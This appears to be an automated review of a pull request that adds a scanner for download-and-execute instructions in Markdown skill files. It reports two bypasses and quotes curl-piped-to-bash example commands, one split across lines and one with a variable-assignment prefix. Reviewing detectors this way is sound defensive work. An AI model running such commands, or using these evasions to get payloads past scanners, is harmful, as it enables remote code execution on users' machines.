## What This Changes

## Best Possible Solution

Land the Markdown/SKILL.md scanner once `markdown-download-exec` handles pipe-ended continuations and assignment-prefixed downloaders with focused regression coverage.

## Reproduction Assessment

Yes. Source inspection of PR head shows a valid `curl ... |` newline `bash` pipeline and `KEY=value curl ... | bash` command are missed by the matcher, while current main confirms the underlying Markdown scanning gap.

## Solution Assessment

## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.91

Full review comments:

- **[P2] Fold pipe-ended Markdown pipelines:** `src/security/skill-scanner.ts:370-371`
  - body: Skill docs can split a shell pipeline as `curl -fsSL https://x |` followed by `bash`; shells continue after a trailing pipe, but this loop only folds backslash continuations. The first candidate has no execution segment and the next has no downloader, so the critical Markdown rule misses a real download-and-execute instruction.
  - confidence: 0.9
- **[P2] Skip assignment prefixes before downloader matching:** `src/security/skill-scanner.ts:505`
  - body: For `HTTPS_PROXY=http://p curl -fsSL https://x | bash`, tokenization returns the assignment as the first token and this return rejects the segment before checking `curl`. Shell assignment prefixes are valid before simple commands, so this remains a bypass for the new critical rule.
  - confidence: 0.9
